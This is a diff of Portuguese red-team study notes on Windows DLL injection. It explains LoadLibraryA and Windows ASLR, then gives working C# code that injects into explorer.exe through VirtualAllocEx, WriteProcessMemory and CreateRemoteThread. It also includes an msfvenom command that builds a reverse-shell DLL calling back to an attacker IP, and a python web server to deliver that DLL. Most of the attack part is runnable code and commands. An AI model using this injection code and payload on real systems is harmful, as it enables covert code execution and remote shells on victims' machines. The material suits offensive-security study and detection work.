@@ -157,9 +157,39 @@ namespace Inject
     }
 }
 ```
-## Injecção de DLL
+# Injeção de DLL
 
-* Código em CSharp
+## API utilizada
+
+```c
+HMODULE LoadLibraryA(
+    // Diretório da DLL a ser carregada
+    LPCSTR lpLibFileName
+);
+```
+
+## Explicação
+
+* A função "LoadLibraryA" carrega uma DLL dentro de um processo, mas ela não pode ser chamada remotamente por outro processo
+* Com isso a ideia é criar uma Thread dentro do processo ao qual queremos atacar e ela ser responsável por carregar a DLL dentro daquele processo, mas esbarramos em um problema, o ASLR
+
+* Segundo o site "madiant" segue uma explicação do funcionamento do ASLR no windows
+
+```
+ELF images, as used in the Linux implementation of ASLR, can use position-independent executables and position-independent code in shared libraries to supply a freshly randomized address space for the main program and all its libraries on each launch—sharing the same machine code between multiple processes even where it is loaded at different addresses. Windows ASLR does not work this way. Instead, each DLL or EXE image gets assigned a random load address by the kernel the first time it is used, and as additional instances of the DLL or EXE are loaded, they receive the same load address. If all instances of an image are unloaded and that image is subsequently loaded again, the image may or may not receive the same base address; see Fact 4. Only rebooting can guarantee fresh base addresses for all images systemwide.
+
+As imagens ELF, conforme usadas na implementação Linux de ASLR, podem usar executáveis com posição idependente (PIE) e código independente de posição em bibliotecas compartilhadas (ASLR) para fornecer um espaço de endereço recém-aleatório para o programa principal e todas as suas bibliotecas em cada inicialização - compartilhando o mesmo código de máquina entre vários processos, mesmo quando é carregado em endereços diferentes. O ASLR do Windows não funciona dessa maneira. Em vez disso, cada imagem DLL ou EXE recebe um endereço de carregamento aleatório do kernel na primeira vez em que é usado e, à medida que instâncias adicionais do DLL ou EXE são carregadas, elas recebem o mesmo endereço de carregamento. Se todas as instâncias de uma imagem forem descarregadas e essa imagem for posteriormente carregada novamente, a imagem pode ou não receber o mesmo endereço base; consulte o Fato 4. Somente a reinicialização pode garantir novos endereços de base para todas as imagens em todo o sistema.
+```
+> Referência: [ASLR no Windows vs Linux](https://www.mandiant.com/resources/blog/six-facts-about-address-space-layout-randomization-on-windows)
+
+* Como os endereços randômicos no Windows são setados na inicialização do sistema e não são individuais para cada EXE ou DLL é possível utilizar o mesmo endereço de uma função externa importada de uma DLL para outro processo
+  * Nesse caso vamos carregar o endereço da função "LoadLibraryA" no nosso executável e utiliza-la no processo remoto
+
+* Passo a passo:
+  * Resolver o endereço da função "LoadLibraryA" dentro do processo o qual queremos atacar
+  * Criar uma Thread e fazer ela carregar a DLL maliciosa
+
+## Código em C#
 
 ```csharp
 using System;
@@ -203,10 +233,15 @@ namespace InjectDLL
             Process[] expProc = Process.GetProcessesByName("explorer");
             int pid = expProc[0].Id;
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            // Função responsável por alocar um espaço na memória do processo atacado para passar 
+            // o caminho da DLL que será carregada pela função "LoadLibraryA"
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             IntPtr outSize;
 
+            // Função responsável por escrever o caminho da DLL dentro do espaço de memória alocado
             Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+
+            // Achando o endereço da função "LoadLibraryA" dentro da DLL kernel32
             IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
             IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
         }
@@ -215,10 +250,12 @@ namespace InjectDLL
 }
 ```
 
-* Criando a dll com o msfvenom
+* Criando a dll unmanaged com o msfvenom e levantando um servidor web
 
 ```
 [root@chucrutis /tmp] ➜ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.16 LPORT=1234 -f dll -o chucrutis.dll
+
+[root@chucrutis /tmp] ➜ python3 -m http.server 1235
 ```
 
 * Após a execução do programa, ele baixa a DLL do servidor Web e faz o programa alvo carregar essa DLL na memória
